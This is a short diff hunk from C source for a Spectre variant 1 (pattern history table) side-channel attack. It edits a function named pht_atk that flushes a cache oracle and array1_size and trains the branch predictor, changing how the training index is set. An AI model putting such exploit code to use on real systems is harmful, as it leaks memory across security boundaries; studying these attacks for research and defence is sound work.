@@ -11,11 +11,11 @@ void victim_function(size_t x) {
 
 int pht_atk(size_t malicious_x){
     static size_t training_x;
-    static int j;
-    
+    static int x, j;
+
     flush(oracle_block, PAGESIZE);
     _mm_mfence();
-    training_x = tries % array1_size;
+    training_x = 0;
     for (j = 30; j >= 0; j--) {
         _mm_clflush( & array1_size);
         for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
